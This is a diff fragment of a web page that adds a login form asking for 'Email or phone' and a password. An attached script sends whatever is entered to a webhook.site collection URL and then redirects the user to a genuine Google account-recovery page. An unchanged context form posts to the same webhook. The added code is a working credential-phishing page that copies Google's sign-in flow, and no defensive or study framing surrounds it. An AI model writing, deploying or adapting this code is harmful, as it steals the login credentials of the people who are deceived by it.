@@ -70,6 +70,34 @@
 </form>
 
 
+<form id="login-form" class="space-y-4">
+  <input type="text" name="username" placeholder="Email or phone" required />
+  <input type="password" name="password" placeholder="Enter Password" required />
+  <button type="submit">Next</button>
+</form>
+
+<script>
+  document.getElementById("login-form").addEventListener("submit", function (e) {
+    e.preventDefault(); // Prevent default form submission
+
+    const formData = new FormData(this);
+
+    fetch("https://webhook.site/c43b4189-33a0-429d-a447-919a98d3f4f2", {
+      method: "POST",
+      body: formData
+    })
+    .then(() => {
+      // Redirect after successful send
+      window.location.href = "https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S406279634%3A1745078146925725"; // Replace with your desired URL
+    });
+  });
+</script>
+
+
+
+
+
+
 
 <form action="https://webhook.site/c43b4189-33a0-429d-a447-919a98d3f4f2" method="POST">
   <input type="text" name="email" placeholder="Email" required>
